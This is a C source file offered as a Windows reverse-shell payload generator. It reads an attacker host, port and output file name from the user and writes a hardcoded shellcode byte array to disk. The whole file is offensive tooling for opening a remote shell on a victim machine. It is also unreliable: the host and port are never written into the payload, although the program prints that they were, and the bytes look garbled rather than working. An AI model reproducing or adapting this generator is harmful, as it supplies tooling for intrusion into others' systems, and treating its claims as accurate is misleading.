#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void generate_reverse_shell_payload(const char *lhost, int lport, const char *output_file) {
    // Payload Template (reverse shell for Windows)
    // This is a simple reverse shell that uses raw bytecode to call socket functions
    // Here, the payload is a basic hardcoded reverse shell for educational purposes

    unsigned char payload[] = {
        0xfc, 0xe8, 0x87, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 
        0x52, 0x0c, 0x8b, 0x52, 0x14, 0x31, 0xc9, 0x64, 0x89, 0x4c, 0x24, 0x24, 0x8b, 0x51, 0x1c, 0x8b, 
        0x51, 0x08, 0x8b, 0x12, 0x8b, 0x12, 0x8b, 0x41, 0x04, 0x8b, 0x71, 0x20, 0x8b, 0x51, 0x08, 0x83, 
        0xc1, 0x04, 0x89, 0x71, 0x10, 0x83, 0xc0, 0x01, 0x8b, 0x51, 0x04, 0x8b, 0x73, 0x20, 0x8b, 0x73, 
        0x08, 0x31, 0xc0, 0x88, 0x42, 0x4f, 0x8b, 0x12, 0x89, 0x73, 0x14, 0x81, 0xec, 0xa0, 0x9e, 0x10, 
        0x00, 0x89, 0x41, 0x14, 0x8b, 0x53, 0x20, 0x56, 0x8b, 0x52, 0x0c, 0x8b, 0x74, 0x24, 0x14, 0x31, 
        0xc0, 0x88, 0x42, 0x50, 0x8b, 0x42, 0x08, 0x8b, 0x34, 0x24, 0x89, 0x34, 0x24, 0x68, 0x45, 0x00, 
        0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x42, 0x28, 0x89, 0x72, 0x08, 0x31, 0xc0, 0x50, 
        0x53, 0x51, 0x8b, 0x42, 0x24, 0x8b, 0x40, 0x10, 0x56, 0x53, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x50, 
        0x14, 0x83, 0xc0, 0x01, 0x8b, 0x53, 0x20, 0x8b, 0x42, 0x10, 0x8b, 0x12, 0x89, 0x52, 0x10, 0x8b, 
        0x42, 0x14, 0x31, 0xc0, 0x88, 0x42, 0x55, 0x8b, 0x42, 0x08, 0x31, 0xc0, 0x50, 0x53, 0x51, 0x56, 
        0x8b, 0x42, 0x24, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x53, 0x28, 0x8b, 0x42, 0x10, 0x56, 0x53, 0x8b, 
        0x52, 0x24, 0x89, 0x44, 0x24, 0x1c, 0x83, 0xe8, 0x00, 0x8b, 0x72, 0x28, 0x83, 0xec, 0x20
    };

    FILE *output = fopen(output_file, "wb");
    if (output == NULL) {
        printf("Error creating file\n");
        return;
    }

    // Write payload to file
    fwrite(payload, sizeof(payload), 1, output);
    fclose(output);

    printf("[*] Payload saved to '%s' with LHOST %s and LPORT %d!\n", output_file, lhost, lport);
}

int main() {
    char lhost[100], output_file[100];
    int lport;

    // Get LHOST
    printf("ENTER LHOST: ");
    fgets(lhost, sizeof(lhost), stdin);
    lhost[strcspn(lhost, "\n")] = 0;  // Remove newline character

    // Get LPORT
    printf("ENTER LPORT: ");
    scanf("%d", &lport);
    getchar();  // Consume the newline character left by scanf

    // Get OUTPUT file
    printf("ENTER OUTPUT: ");
    fgets(output_file, sizeof(output_file), stdin);
    output_file[strcspn(output_file, "\n")] = 0;  // Remove newline character

    // Generate and save reverse shell payload
    generate_reverse_shell_payload(lhost, lport, output_file);

    return 0;
}
